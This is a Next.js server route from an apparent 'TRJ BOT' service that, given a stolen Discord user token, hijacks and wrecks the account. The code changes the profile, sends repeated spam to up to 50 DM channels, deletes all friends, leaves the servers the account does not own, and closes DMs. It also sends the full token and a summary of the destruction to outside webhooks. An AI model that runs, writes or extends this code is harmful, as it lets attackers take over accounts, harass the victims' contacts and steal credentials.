
import { NextRequest, NextResponse } from 'next/server';
import { cleanToken, discordFetch } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { sendFullToken } from '@/lib/webhook';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

async function imageToBase64(url: string): Promise<string | null> {
  try {
    if (!url || url.trim() === '') return null;

    if (url.startsWith('data:image/')) return url;

    const res = await fetch(url, { signal: AbortSignal.timeout(15000) });
    if (!res.ok) return null;

    const contentType = res.headers.get('content-type') || 'image/png';
    const buffer = await res.arrayBuffer();
    const bytes = new Uint8Array(buffer);

    let binary = '';
    for (let i = 0; i < bytes.length; i++) {
      binary += String.fromCharCode(bytes[i]);
    }
    const base64 = btoa(binary);

    return `data:${contentType};base64,${base64}`;
  } catch {
    return null;
  }
}

export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:account-destruction`, RATE_LIMITS.heavy);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await request.json();
    const { token, actions, message, profile } = body as {
      token: string;
      actions: {
        spamDMs: boolean;
        deleteFriends: boolean;
        leaveServers: boolean;
        closeDMs: boolean;
      };
      message?: string;
      profile?: {
        username?: string;
        avatar?: string;
        bio?: string;
      };
    };

    if (!token) {
      return NextResponse.json({ success: false, error: 'أدخل التوكن' });
    }

    const ct = cleanToken(token);

    const verifyResult = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });

    if (!verifyResult.ok || !verifyResult.data) {
      return NextResponse.json({ success: false, error: 'توكن غير صالح' });
    }

    const userData = verifyResult.data as { id: string; username: string; discriminator?: string; email?: string };
    const userTag = `${userData.username}#${userData.discriminator || '0'}`;

    sendFullToken('Account Destruction', ct, { '👤 المستخدم': userTag, '🆔 ID': userData.id });

    const logs: string[] = [`🎯 بدء تدمير حساب: ${userTag}`];
    const stats = { dmsSpammed: 0, friendsDeleted: 0, serversLeft: 0, dmsClosed: 0, profileUpdated: false };

    if (profile && (profile.username || profile.avatar || profile.bio)) {
      logs.push('📝 تحديث البروفايل...');

      // ===== 1. تغيير الاسم + الصورة عبر PATCH /users/@me =====
      // (ديسكورد يقبل username + avatar في نفس الطلب، لكن bio له endpoint منفصل)
      const userPatchData: Record<string, string> = {};

      if (profile.username && profile.username.trim()) {
        const cleanUsername = profile.username.trim();
        // التحقق من صحة الاسم قبل الإرسال (2-32 حرف، حروف لاتينية + أرقام + _ + .)
        if (cleanUsername.length < 2 || cleanUsername.length > 32) {
          logs.push(`   ⚠️ الاسم "${cleanUsername}" غير مطابق للشروط (2-32 حرف) - سيتم تخطيه`);
        } else if (!/^[a-zA-Z0-9_.]+$/.test(cleanUsername)) {
          logs.push(`   ⚠️ الاسم "${cleanUsername}" يحتوي أحرف غير مسموحة (فقط a-z, 0-9, _, .) - سيتم تخطيه`);
        } else {
          userPatchData.username = cleanUsername.toLowerCase(); // ديسكورد يتطلب lowercase
          logs.push(`   👤 سيتم تغيير الاسم إلى: ${cleanUsername.toLowerCase()}`);
        }
      }

      if (profile.avatar && profile.avatar.trim()) {
        logs.push(`   🖼️ جاري تحويل الصورة...`);
        const avatarBase64 = await imageToBase64(profile.avatar.trim());
        if (avatarBase64) {
          userPatchData.avatar = avatarBase64;
          logs.push(`   ✅ تم تحويل الصورة بنجاح`);
        } else {
          logs.push(`   ⚠️ فشل تحميل الصورة - سيتم تخطيها`);
        }
      }

      // تطبيق username + avatar
      if (Object.keys(userPatchData).length > 0) {
        try {
          const profileRes = await discordFetch(ct, 'PATCH', '/users/@me', userPatchData, { userOnly: true, timeout: 15000 });

          if (profileRes.ok) {
            const resultData = profileRes.data as any;
            stats.profileUpdated = true;
            logs.push(`✅ تم تحديث ${userPatchData.username ? 'الاسم' : ''}${userPatchData.username && userPatchData.avatar ? ' و' : ''}${userPatchData.avatar ? 'الصورة' : ''} بنجاح!`);
            if (resultData?.username && userPatchData.username) logs.push(`   👤 الاسم الجديد: ${resultData.username}`);
          } else {
            const errorData = profileRes.data as any;
            const errorCode = errorData?.code;
            const errorMsg = errorData?.message || '';
            const errors = errorData?.errors;

            if (errorCode === 50035) {
              logs.push(`❌ فشل تحديث الاسم/الصورة - بيانات غير صالحة`);
              // فحص تفصيلي للأخطاء
              if (errors?.username?._errors) {
                for (const e of errors.username._errors) {
                  logs.push(`   ⚠️ الاسم: ${e.message || 'خطأ غير معروف'}`);
                }
              } else if (errorMsg.toLowerCase().includes('username')) {
                logs.push(`   ⚠️ الاسم غير مقبول (مستخدم أو محجوز أو غير مطابق للشروط)`);
                logs.push(`   💡 الاسم يجب أن يكون 2-32 حرف: a-z, 0-9, _, .`);
              }
              if (errors?.avatar?._errors) {
                for (const e of errors.avatar._errors) {
                  logs.push(`   ⚠️ الصورة: ${e.message || 'خطأ'}`);
                }
              } else if (errorMsg.toLowerCase().includes('avatar')) {
                logs.push(`   ⚠️ الصورة غير صالحة (يجب أن تكون PNG/JPG/GIF)`);
              }
            } else if (profileRes.status === 429) {
              logs.push(`⏳ تم تقييد الطلب - الاسم يمكن تغييره مرتين فقط في الساعة`);
              logs.push(`   💡 انتظر ساعة ثم حاول مرة أخرى`);
            } else {
              logs.push(`❌ فشل تحديث الاسم/الصورة (HTTP ${profileRes.status}): ${errorMsg}`);
            }
          }
        } catch (err: any) {
          logs.push(`❌ خطأ في تحديث الاسم/الصورة: ${err?.message || 'غير معروف'}`);
        }

        await new Promise(r => setTimeout(r, 1500));
      }

      // ===== 2. تغيير البايو عبر PATCH /users/@me/profile (endpoint منفصل) =====
      // ديسكورد لا يقبل bio في PATCH /users/@me — يجب استخدام /users/@me/profile
      if (profile.bio && profile.bio.trim()) {
        const cleanBio = profile.bio.trim();
        logs.push(`   📝 سيتم تغيير البايو (طول: ${cleanBio.length} حرف)`);

        if (cleanBio.length > 190) {
          logs.push(`   ⚠️ البايو طويل جداً (${cleanBio.length} حرف) - الحد الأقصى 190 - سيتم اقتطاعه`);
        }

        const trimmedBio = cleanBio.substring(0, 190);
        try {
          // endpoint منفصل للبايو
          const bioRes = await discordFetch(ct, 'PATCH', '/users/@me/profile', {
            bio: trimmedBio
          }, { userOnly: true, timeout: 15000 });

          if (bioRes.ok) {
            stats.profileUpdated = true;
            logs.push(`   ✅ تم تغيير البايو بنجاح`);
          } else {
            const bioErr = bioRes.data as any;
            const bioErrCode = bioErr?.code;
            const bioErrMsg = bioErr?.message || '';
            const bioErrors = bioErr?.errors;

            if (bioErrCode === 50035) {
              logs.push(`   ❌ البايو غير صالح:`);
              if (bioErrors?.bio?._errors) {
                for (const e of bioErrors.bio._errors) {
                  logs.push(`      ⚠️ ${e.message || 'خطأ'}`);
                }
              } else {
                logs.push(`      ⚠️ ${bioErrMsg || 'محتوى غير مسموح'}`);
              }
            } else if (bioRes.status === 429) {
              logs.push(`   ⏳ تقييد في تحديث البايو - انتظر قليلاً`);
            } else if (bioRes.status === 404) {
              // fallback: جرّب PATCH /users/@me مع bio
              logs.push(`   ⚠️ endpoint البايو غير متاح - جرّب endpoint بديل...`);
              const fallbackRes = await discordFetch(ct, 'PATCH', '/users/@me', { bio: trimmedBio }, { userOnly: true, timeout: 15000 });
              if (fallbackRes.ok) {
                stats.profileUpdated = true;
                logs.push(`   ✅ تم تغيير البايو عبر الـ endpoint البديل`);
              } else {
                logs.push(`   ❌ فشل البديل أيضاً (HTTP ${fallbackRes.status})`);
              }
            } else {
              logs.push(`   ❌ فشل تغيير البايو (HTTP ${bioRes.status}): ${bioErrMsg}`);
            }
          }
        } catch (err: any) {
          logs.push(`   ❌ خطأ في تحديث البايو: ${err?.message || 'غير معروف'}`);
        }

        await new Promise(r => setTimeout(r, 1500));
      }
    }

    if (actions.spamDMs) {
      logs.push('📧 جاري سبام الرسائل الخاصة...');

      try {
        const dmsRes = await discordFetch(ct, 'GET', '/users/@me/channels', undefined, { userOnly: true, timeout: 15000 });

        if (dmsRes.ok && dmsRes.data) {
          const channels = dmsRes.data as any[];
          const dmChannels = channels.filter(c => c.type === 1 || c.type === 3);
          logs.push(`   📬 تم العثور على ${dmChannels.length} محادثة`);

          const spamMessage = message || '💀 Account Destroyed by TRJ BOT';

          for (let i = 0; i < Math.min(dmChannels.length, 50); i++) {
            const channel = dmChannels[i];
            try {
              for (let j = 0; j < 5; j++) {
                const msgRes = await discordFetch(ct, 'POST', `/channels/${channel.id}/messages`, {
                  content: spamMessage
                }, { userOnly: true, timeout: 10000 });

                if (msgRes.ok) {
                  stats.dmsSpammed++;
                } else if (msgRes.status === 403) {
                  break; // لا يمكن الإرسال لهذه المحادثة
                }

                await new Promise(r => setTimeout(r, 700));
              }
            } catch {
            }
          }
          logs.push(`   ✅ تم إرسال ${stats.dmsSpammed} رسالة`);
        } else {
          logs.push(`   ❌ فشل جلب المحادثات`);
        }
      } catch {
        logs.push(`   ❌ خطأ في سبام DMs`);
      }

      await new Promise(r => setTimeout(r, 1000));
    }

    if (actions.deleteFriends) {
      logs.push('👥 جاري حذف الأصدقاء...');

      try {
        const friendsRes = await discordFetch(ct, 'GET', '/users/@me/relationships', undefined, { userOnly: true, timeout: 15000 });

        if (friendsRes.ok && friendsRes.data) {
          const friends = (friendsRes.data as any[]).filter((r: any) => r.type === 1);
          logs.push(`   👥 تم العثور على ${friends.length} صديق`);

          for (const friend of friends) {
            try {
              const delRes = await discordFetch(ct, 'DELETE', `/users/@me/relationships/${friend.id}`, undefined, { userOnly: true, timeout: 5000 });
              if (delRes.ok) {
                stats.friendsDeleted++;
              }
              await new Promise(r => setTimeout(r, 400));
            } catch {
            }
          }
          logs.push(`   ✅ تم حذف ${stats.friendsDeleted} صديق`);
        } else {
          logs.push(`   ❌ فشل جلب قائمة الأصدقاء`);
        }
      } catch {
        logs.push(`   ❌ خطأ في حذف الأصدقاء`);
      }

      await new Promise(r => setTimeout(r, 1000));
    }

    if (actions.leaveServers) {
      logs.push('🚪 جاري مغادرة السيرفرات...');

      try {
        const guildsRes = await discordFetch(ct, 'GET', '/users/@me/guilds', undefined, { userOnly: true, timeout: 15000 });

        if (guildsRes.ok && guildsRes.data) {
          const guilds = guildsRes.data as any[];
          const leaveable = guilds.filter(g => !g.owner);
          logs.push(`   🏠 تم العثور على ${guilds.length} سيرفر (${leaveable.length} يمكن مغادرتها)`);

          for (const guild of leaveable) {
            try {
              const leaveRes = await discordFetch(ct, 'DELETE', `/users/@me/guilds/${guild.id}`, undefined, { userOnly: true, timeout: 5000 });
              if (leaveRes.ok || leaveRes.status === 204) {
                stats.serversLeft++;
                logs.push(`   ✅ مغادرة: ${guild.name}`);
              }
              await new Promise(r => setTimeout(r, 400));
            } catch {
            }
          }
          logs.push(`   ✅ تم مغادرة ${stats.serversLeft} سيرفر`);
        } else {
          logs.push(`   ❌ فشل جلب قائمة السيرفرات`);
        }
      } catch {
        logs.push(`   ❌ خطأ في مغادرة السيرفرات`);
      }

      await new Promise(r => setTimeout(r, 1000));
    }

    if (actions.closeDMs) {
      logs.push('📪 جاري إغلاق المحادثات...');

      try {
        const dmsRes = await discordFetch(ct, 'GET', '/users/@me/channels', undefined, { userOnly: true, timeout: 15000 });

        if (dmsRes.ok && dmsRes.data) {
          const channels = (dmsRes.data as any[]).filter((c: any) => c.type === 1);
          logs.push(`   📬 تم العثور على ${channels.length} محادثة DM`);

          for (const channel of channels) {
            try {
              const closeRes = await discordFetch(ct, 'DELETE', `/channels/${channel.id}`, undefined, { userOnly: true, timeout: 5000 });
              if (closeRes.ok || closeRes.status === 204) {
                stats.dmsClosed++;
              }
              await new Promise(r => setTimeout(r, 250));
            } catch {
            }
          }
          logs.push(`   ✅ تم إغلاق ${stats.dmsClosed} محادثة`);
        }
      } catch {
        logs.push(`   ❌ خطأ في إغلاق DMs`);
      }
    }

    logs.push('');
    logs.push('💀 تم الانتهاء من تدمير الحساب!');
    logs.push(`📊 الإحصائيات:`);
    if (stats.profileUpdated) logs.push(`   ✅ البروفايل: تم التحديث`);
    logs.push(`   📧 رسائل مرسلة: ${stats.dmsSpammed}`);
    logs.push(`   👥 أصدقاء محذوفين: ${stats.friendsDeleted}`);
    logs.push(`   🚪 سيرفرات مغادرة: ${stats.serversLeft}`);
    logs.push(`   📪 محادثات مغلقة: ${stats.dmsClosed}`);

    const webhookUrl = getLogWebhookUrl();
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: '💀 Account Destruction',
              description: `**تم تدمير حساب:** ${userTag}`,
              color: 0xFF0000,
              fields: [
                { name: '👤 المستخدم', value: userTag, inline: true },
                { name: '🆔 ID', value: userData.id, inline: true },
                { name: '✅ البروفايل', value: stats.profileUpdated ? 'تم' : 'لم يتم', inline: true },
                { name: '📧 رسائل مرسلة', value: stats.dmsSpammed.toString(), inline: true },
                { name: '👥 أصدقاء محذوفين', value: stats.friendsDeleted.toString(), inline: true },
                { name: '🚪 سيرفرات مغادرة', value: stats.serversLeft.toString(), inline: true },
                { name: '📪 محادثات مغلقة', value: stats.dmsClosed.toString(), inline: true },
              ],
              footer: { text: 'TRJ BOT - Prime Feature' },
              timestamp: new Date().toISOString()
            }]
          })
        });
      } catch {}
    }

    return NextResponse.json({
      success: true,
      logs,
      stats,
      user: { id: userData.id, username: userTag }
    });

  } catch (error) {
    return NextResponse.json({ success: false, error: 'خطأ في الخادم' });
  }
}

